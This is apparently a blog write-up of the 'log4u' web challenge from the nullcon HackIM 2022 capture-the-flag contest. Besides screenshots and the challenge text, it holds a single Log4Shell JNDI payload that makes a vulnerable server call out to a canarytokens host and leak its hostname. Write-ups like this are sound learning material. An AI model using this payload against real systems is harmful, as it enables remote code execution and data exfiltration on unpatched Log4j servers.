---
layout: single
title: nullcon HackIM 2022
excerpt: "log4u - texnology - fil3serv4r writeups[web]"
date: 2022-4-11
classes: wide
header:
  teaser: 
  teaser_home_page: false
  icon:
categories:
  - nullcon HackIM 2022
  - CTF Jeo
tags:  
  - CTF
---



| CTFTime Place | Points | Team |
| --- | --- | --- |
| [30](https://ctftime.org/event/1594/) | 912.000 | Solo - trelosgamiolis |


# log4u
### Challenge Description
```A teacher once told me to "never log things you can't trust...", but it's such a nice business opportunity, so I couldn't resist.```


![b1a57c3f-71e1-4bbf-b299-717490b428fd](https://user-images.githubusercontent.com/45040001/162817938-341792b4-52b0-4d0b-8a90-cc8598d2b0d6.png)



![image](https://user-images.githubusercontent.com/45040001/162826021-f43f8f75-bd20-44c0-be68-52378c202bb3.png)
## Generated log4shell token:
```java
${jndi:ldap://x${hostName}.L4J.z5wbevl1c0v3t8gxs856c96m3.canarytokens.com/a}
```


![Screenshot_2022-04-08_21_17_11](https://user-images.githubusercontent.com/45040001/162826208-c584bd56-8411-4d8e-944e-71bc5925fd36.png)
